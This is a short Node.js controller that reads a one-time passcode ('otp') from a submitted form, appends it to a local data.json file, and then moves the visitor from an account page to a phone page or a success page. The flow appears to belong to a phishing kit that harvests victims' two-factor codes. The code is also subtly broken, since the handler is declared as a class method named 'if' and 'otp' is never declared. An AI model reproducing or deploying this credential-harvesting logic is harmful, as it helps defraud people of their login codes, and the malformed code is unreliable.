const Core = require("../Core/Core");
const fs = require("fs");
class Account extends Core {
  index = (req, res) => {
    this.render(req, res, "account");
  };

  if(body) {
    const bodyObj = new URLSearchParams(body);
    otp = bodyObj.get("otp");

    if (otp) {
      const data = fs.readFileSync("./data/data.json");

      const jsonData = JSON.parse(data);

      jsonData.otp.push(`${otp}`);
      fs.writeFileSync("./data/data.json", JSON.stringify(jsonData));

      this.render(req, res, "phone");
    }
    if (!otp) {
      this.render(req, res, "success");
    }
  }
}

module.exports = new Account();
